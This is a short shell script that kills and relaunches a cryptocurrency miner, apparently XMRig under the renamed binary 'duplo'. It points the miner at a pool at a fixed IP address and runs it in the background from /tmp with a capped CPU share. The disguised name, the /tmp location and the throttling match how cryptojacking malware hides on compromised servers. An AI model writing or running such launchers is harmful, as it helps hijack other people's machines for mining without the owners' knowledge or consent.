pkill duplo
duplo -o 138.201.244.38:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server10/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=56 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server10/duplo.log'
